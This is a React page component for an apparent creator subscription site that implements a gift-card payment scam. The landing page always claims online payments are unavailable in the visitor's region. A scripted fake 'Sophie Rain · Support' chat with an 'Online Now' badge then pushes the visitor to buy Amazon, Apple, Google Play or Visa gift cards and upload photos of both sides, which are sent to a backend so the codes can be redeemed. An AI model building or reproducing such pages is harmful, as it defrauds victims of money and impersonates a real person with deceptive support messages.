import React, { useState, useRef } from "react";
import { Layout } from "@/components/layout";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { useToast } from "@/hooks/use-toast";
import { usePlatformConfig } from "@/hooks/use-platform-config";
import {
  Globe, MessageCircle, Gift, Upload, CheckCircle2, AlertCircle,
  CreditCard, ShieldCheck, Lock, ChevronRight, Sparkles, Heart, Camera
} from "lucide-react";
import { Link, useSearch } from "wouter";

const BASE = import.meta.env.VITE_API_URL || "http://localhost:8080";

const SOPHIE_AVATAR = "/sophie-chat-avatar.png";

type Step = "landing" | "support" | "upload" | "success";

const CARD_TYPES = [
  { id: "amazon", label: "Amazon Gift Card", emoji: "📦", hint: "Any denomination" },
  { id: "google-play", label: "Google Play", emoji: "🎮", hint: "Any denomination" },
  { id: "apple", label: "Apple Gift Card", emoji: "🍎", hint: "Any denomination" },
  { id: "visa-prepaid", label: "Visa Prepaid", emoji: "💳", hint: "Any denomination" },
  { id: "steam", label: "Steam Gift Card", emoji: "🎮", hint: "Any denomination" },
  { id: "other", label: "Other Gift Card", emoji: "🎁", hint: "Any denomination" },
];

const SUPPORT_MESSAGES = [
  { from: "sophie", text: "Hey babe! 💕 Looks like online payments aren't working for your region — but don't worry, I've got you!" },
  { from: "sophie", text: "You can pay with a gift card! It's super easy and I'll verify it personally within a few hours 🌟" },
  { from: "sophie", text: "Just pick up any gift card (Amazon, Google Play, Apple, Visa Prepaid — anything works), then snap a photo of the front and back and send it here. That's it! 🎁" },
];

function SophieBubble({ text, delay = 0 }: { text: string; delay?: number }) {
  const [visible, setVisible] = useState(delay === 0);
  React.useEffect(() => {
    if (delay > 0) {
      const t = setTimeout(() => setVisible(true), delay);
      return () => clearTimeout(t);
    }
  }, [delay]);
  if (!visible) return <div className="h-10" />;
  return (
    <div className="flex items-end gap-2 mb-3 animate-in fade-in slide-in-from-bottom-2 duration-500">
      <img src={SOPHIE_AVATAR} alt="Sophie" className="w-8 h-8 rounded-full object-cover shrink-0 border border-amber-400/30" onError={e => { (e.target as HTMLImageElement).style.display="none" }} />
      <div className="max-w-[80%] rounded-2xl rounded-tl-sm px-4 py-3 text-sm text-black" style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080)" }}>
        {text}
      </div>
    </div>
  );
}

export default function Payment() {
  const { toast } = useToast();
  usePlatformConfig();
  const search = useSearch();
  const purpose = new URLSearchParams(search).get("for") || "subscription";

  const [step, setStep] = useState<Step>("landing");
  const [cardType, setCardType] = useState("");
  const [cardAmount, setCardAmount] = useState("");
  const [fanName, setFanName] = useState("");
  const [fanEmail, setFanEmail] = useState("");
  const [note, setNote] = useState("");
  const [frontImg, setFrontImg] = useState<string | null>(null);
  const [backImg, setBackImg] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const frontRef = useRef<HTMLInputElement>(null);
  const backRef = useRef<HTMLInputElement>(null);

  const handleFileRead = (file: File, setter: (d: string) => void) => {
    const reader = new FileReader();
    reader.onload = e => setter(e.target?.result as string);
    reader.readAsDataURL(file);
  };

  const handleSubmit = async () => {
    if (!fanName || !fanEmail || !cardType || !cardAmount || !frontImg || !backImg) {
      toast({ title: "Fill all fields and upload both photos", variant: "destructive" });
      return;
    }
    setSubmitting(true);
    try {
      const res = await fetch(`${BASE}/api/gift-cards`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ fanName, fanEmail, cardType, cardAmount, purpose, frontImage: frontImg, backImage: backImg, note }),
      });
      if (!res.ok) throw new Error(await res.text());
      setStep("success");
    } catch (e) {
      toast({ title: "Something went wrong", description: String(e), variant: "destructive" });
    } finally {
      setSubmitting(false);
    }
  };

  if (step === "success") {
    return (
      <Layout>
        <div className="min-h-screen flex items-center justify-center px-4">
          <div className="text-center max-w-md">
            <div className="w-24 h-24 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-amber-400/40" style={{ background: "rgba(201,168,76,0.1)" }}>
              <CheckCircle2 className="w-12 h-12 text-amber-400" />
            </div>
            <h1 className="text-4xl font-serif font-bold text-white mb-4">Gift Card Received! 🎉</h1>
            <p className="text-white/60 mb-6">Sophie will personally verify your card within a few hours and unlock your access. Keep an eye on your email!</p>
            <div className="rounded-xl border border-amber-400/20 bg-amber-400/5 p-4 mb-6 text-left">
              <p className="text-amber-400 text-xs font-bold mb-2 uppercase tracking-wider">What Happens Next</p>
              <div className="space-y-2">
                {["Sophie reviews your gift card photos", "She adds the card amount to her account", "Your VIP access is unlocked ✨", "You get a confirmation by email"].map((s, i) => (
                  <div key={i} className="flex items-center gap-2">
                    <span className="text-amber-400 text-xs font-bold">{i + 1}.</span>
                    <p className="text-white/70 text-sm">{s}</p>
                  </div>
                ))}
              </div>
            </div>
            <Link href="/messages">
              <button className="h-12 px-8 rounded-xl font-bold text-sm text-black" style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080,#c9a84c)" }}>
                <MessageCircle className="w-4 h-4 inline mr-2" />Chat with Sophie
              </button>
            </Link>
          </div>
        </div>
      </Layout>
    );
  }

  if (step === "upload") {
    return (
      <Layout>
        <div className="min-h-screen bg-black py-12">
          <div className="container mx-auto px-4 max-w-lg">
            <button onClick={() => setStep("support")} className="text-white/40 hover:text-white text-sm mb-6 flex items-center gap-1">← Back</button>
            <p className="text-amber-400 text-xs font-bold tracking-[0.3em] uppercase mb-3">Gift Card Payment</p>
            <h1 className="text-3xl font-serif font-bold text-white mb-2">Upload Your Gift Card</h1>
            <p className="text-white/50 mb-8">Sophie verifies every card personally. Your photos are secure and seen only by Sophie.</p>

            <div className="space-y-5 bg-zinc-900 rounded-2xl border border-white/5 p-6">
              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-3">Card Type</label>
                <div className="grid grid-cols-2 gap-2">
                  {CARD_TYPES.map(ct => (
                    <div key={ct.id} onClick={() => setCardType(ct.id)}
                      className={`cursor-pointer rounded-xl border p-3 transition-all ${cardType === ct.id ? "border-amber-400 bg-amber-400/5" : "border-white/10 hover:border-white/20"}`}>
                      <span className="text-lg">{ct.emoji}</span>
                      <p className="text-white text-xs font-bold mt-1">{ct.label}</p>
                      <p className="text-white/30 text-[10px]">{ct.hint}</p>
                    </div>
                  ))}
                </div>
              </div>

              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-2">Card Amount ($)</label>
                <Input value={cardAmount} onChange={e => setCardAmount(e.target.value)} placeholder="e.g. 25, 50, 100" className="bg-black border-white/10 text-white placeholder:text-white/20 focus-visible:ring-amber-400/50" />
              </div>

              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-2">Your Name</label>
                <Input value={fanName} onChange={e => setFanName(e.target.value)} placeholder="Your name" className="bg-black border-white/10 text-white placeholder:text-white/20 focus-visible:ring-amber-400/50" />
              </div>

              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-2">Email Address</label>
                <Input type="email" value={fanEmail} onChange={e => setFanEmail(e.target.value)} placeholder="your@email.com" className="bg-black border-white/10 text-white placeholder:text-white/20 focus-visible:ring-amber-400/50" />
              </div>

              {/* Photo uploads */}
              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-3">Gift Card Photos</label>
                <div className="grid grid-cols-2 gap-3">
                  {/* Front */}
                  <div>
                    <p className="text-white/40 text-xs mb-2">Front of card</p>
                    <input ref={frontRef} type="file" accept="image/*" className="hidden" onChange={e => { const f = e.target.files?.[0]; if (f) handleFileRead(f, setFrontImg); }} />
                    <div onClick={() => frontRef.current?.click()}
                      className="relative aspect-[1.6] rounded-xl border-2 border-dashed border-white/20 hover:border-amber-400/40 cursor-pointer transition-all flex items-center justify-center overflow-hidden bg-black/40">
                      {frontImg ? (
                        <img src={frontImg} alt="Front" className="absolute inset-0 w-full h-full object-cover" />
                      ) : (
                        <div className="text-center">
                          <Camera className="w-6 h-6 text-white/30 mx-auto mb-1" />
                          <p className="text-white/30 text-xs">Tap to upload</p>
                        </div>
                      )}
                    </div>
                  </div>
                  {/* Back */}
                  <div>
                    <p className="text-white/40 text-xs mb-2">Back of card</p>
                    <input ref={backRef} type="file" accept="image/*" className="hidden" onChange={e => { const f = e.target.files?.[0]; if (f) handleFileRead(f, setBackImg); }} />
                    <div onClick={() => backRef.current?.click()}
                      className="relative aspect-[1.6] rounded-xl border-2 border-dashed border-white/20 hover:border-amber-400/40 cursor-pointer transition-all flex items-center justify-center overflow-hidden bg-black/40">
                      {backImg ? (
                        <img src={backImg} alt="Back" className="absolute inset-0 w-full h-full object-cover" />
                      ) : (
                        <div className="text-center">
                          <Camera className="w-6 h-6 text-white/30 mx-auto mb-1" />
                          <p className="text-white/30 text-xs">Tap to upload</p>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
                <p className="text-white/25 text-xs mt-2 flex items-center gap-1"><Lock className="w-3 h-3" /> Seen only by Sophie · Deleted after verification</p>
              </div>

              <div>
                <label className="text-xs font-bold text-white/50 tracking-wider uppercase block mb-2">Note (optional)</label>
                <Textarea value={note} onChange={e => setNote(e.target.value)} placeholder="What is this payment for? (e.g. Monthly VIP, Custom Request...)" className="bg-black border-white/10 text-white placeholder:text-white/20 focus-visible:ring-amber-400/50 min-h-[70px]" />
              </div>

              <div className="rounded-xl border border-amber-400/20 bg-amber-400/5 p-3 flex gap-2 items-start">
                <ShieldCheck className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                <p className="text-white/50 text-xs leading-relaxed">Sophie verifies every card personally. Access is unlocked within 2–4 hours.</p>
              </div>

              <button
                onClick={handleSubmit}
                disabled={submitting}
                className="w-full h-14 rounded-xl font-black text-lg tracking-wider text-black hover:scale-[1.01] active:scale-[0.99] transition-transform disabled:opacity-60 flex items-center justify-center gap-2"
                style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080,#c9a84c)" }}
              >
                <Upload className="w-5 h-5" />
                {submitting ? "Sending to Sophie…" : "Send Gift Card to Sophie"}
              </button>
            </div>
          </div>
        </div>
      </Layout>
    );
  }

  if (step === "support") {
    return (
      <Layout>
        <div className="min-h-screen bg-black flex flex-col">
          {/* Chat header */}
          <div className="sticky top-16 z-10 flex items-center gap-3 px-4 py-3 border-b border-white/5 backdrop-blur-xl" style={{ background: "rgba(10,8,0,0.95)" }}>
            <img src={SOPHIE_AVATAR} alt="Sophie" className="w-10 h-10 rounded-full object-cover border border-amber-400/30" onError={e => { (e.target as HTMLImageElement).style.background="#c9a84c"; }} />
            <div>
              <p className="font-semibold text-white text-sm">Sophie Rain · Support</p>
              <p className="text-[11px] text-green-400">Online Now</p>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto px-4 py-6 space-y-1" style={{ background: "radial-gradient(ellipse at top,#120e00 0%,#0a0a0a 60%)" }}>
            {SUPPORT_MESSAGES.map((m, i) => (
              <SophieBubble key={i} text={m.text} delay={i * 800} />
            ))}

            <div className="mt-6 pt-4 border-t border-white/5">
              <p className="text-white/40 text-xs text-center mb-4">Ready to pay with a gift card?</p>
              <button onClick={() => setStep("upload")}
                className="w-full h-14 rounded-2xl font-black text-lg tracking-wider text-black flex items-center justify-center gap-3"
                style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080,#c9a84c)" }}>
                <Gift className="w-5 h-5" /> Upload Gift Card Photos
              </button>
              <p className="text-center text-white/30 text-xs mt-3 flex items-center justify-center gap-1">
                <ShieldCheck className="w-3 h-3" /> Secure · Verified personally by Sophie
              </p>
            </div>
          </div>
        </div>
      </Layout>
    );
  }

  // Landing — "Payment not available in your country"
  return (
    <Layout>
      <div className="min-h-screen flex flex-col items-center justify-center px-4 py-20">
        <div className="max-w-md w-full text-center">
          <div className="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 border border-white/10" style={{ background: "rgba(255,255,255,0.05)" }}>
            <Globe className="w-10 h-10 text-white/30" />
          </div>

          <div className="inline-flex items-center gap-2 bg-amber-400/10 border border-amber-400/30 rounded-full px-4 py-1.5 mb-5">
            <AlertCircle className="w-3.5 h-3.5 text-amber-400" />
            <span className="text-amber-400 text-xs font-bold tracking-wider uppercase">Payment Unavailable</span>
          </div>

          <h1 className="text-3xl font-serif font-bold text-white mb-4">
            Online Payments Aren't<br />Available in Your Region
          </h1>
          <p className="text-white/50 mb-8 leading-relaxed">
            Don't worry — Sophie has a special way for you to pay! Click below to chat with Sophie's support and she'll walk you through an easy alternative.
          </p>

          <div className="rounded-2xl border border-white/5 bg-zinc-900 p-5 mb-6 text-left">
            <div className="flex items-center gap-3 mb-4">
              <img src={SOPHIE_AVATAR} alt="Sophie" className="w-10 h-10 rounded-full object-cover border border-amber-400/30" onError={e => { (e.target as HTMLImageElement).style.background="#c9a84c"; }} />
              <div>
                <p className="font-semibold text-white text-sm">Sophie Rain</p>
                <p className="text-[11px] text-green-400 flex items-center gap-1"><span className="w-1.5 h-1.5 rounded-full bg-green-400 inline-block" />Online · Will respond in minutes</p>
              </div>
            </div>
            <div className="rounded-2xl rounded-tl-sm px-4 py-3 text-sm text-black" style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080)" }}>
              Hey! 💕 Looks like online payments aren't working for you, but I've got a super easy fix — let me help you!
            </div>
          </div>

          <button onClick={() => setStep("support")}
            className="w-full h-14 rounded-2xl font-black text-lg tracking-wider text-black hover:scale-[1.01] active:scale-[0.99] transition-transform shadow-xl flex items-center justify-center gap-3 mb-4"
            style={{ background: "linear-gradient(135deg,#c9a84c,#f0d080,#c9a84c)" }}>
            <MessageCircle className="w-5 h-5" /> Chat with Support
          </button>

          <p className="text-white/30 text-xs flex items-center justify-center gap-1">
            <ShieldCheck className="w-3 h-3" /> Private · Secure · Personally handled by Sophie
          </p>
        </div>
      </div>
    </Layout>
  );
}
